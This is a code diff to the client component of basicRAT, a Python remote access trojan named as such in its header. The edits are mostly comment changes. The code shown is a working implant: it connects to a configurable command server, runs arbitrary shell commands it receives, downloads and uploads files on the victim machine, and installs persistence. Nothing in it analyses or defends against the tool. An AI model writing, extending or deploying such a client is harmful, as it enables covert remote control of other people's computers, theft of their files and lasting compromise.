@@ -6,7 +6,6 @@
 # https://github.com/vesche/basicRAT
 #
 
-import os
 import socket
 import subprocess
 import sys
@@ -19,6 +18,7 @@ from core import survey
 from core import toolkit
 
 
+# change these to suit your needs
 HOST = 'localhost'
 PORT = 1337
 
@@ -30,18 +30,26 @@ def main():
 
     while True:
         results = ''
+
+        # wait to receive data from server
         data = client.recvGCM()
 
+        # don't process empty data
         if not data:
             continue
 
         # seperate prompt into command and action
         cmd, _, action = data.partition(' ')
 
-        # stop client
+        # kill client
         if cmd == 'kill':
             conn.close()
             sys.exit(0)
+
+        # regenerate DH key
+        # elif cmd == 'rekey':
+        #    client.dh_key = crypto.diffiehellman(client.conn)
+        #    continue
 
         # run a command
         elif cmd == 'execute':
@@ -50,19 +58,13 @@ def main():
                       stdin=subprocess.PIPE)
             results = results.stdout.read() + results.stderr.read()
 
-        # send file
         elif cmd == 'download':
             client.sendfile(action.rstrip())
             continue
 
-        # receive file
         elif cmd == 'upload':
             client.recvfile(action.rstrip())
             continue
-
-        # regenerate DH key
-        # elif cmd == 'rekey':
-        #    client.dh_key = crypto.diffiehellman(client.conn)
 
         elif cmd == 'persistence':
             results = persistence.run(plat)
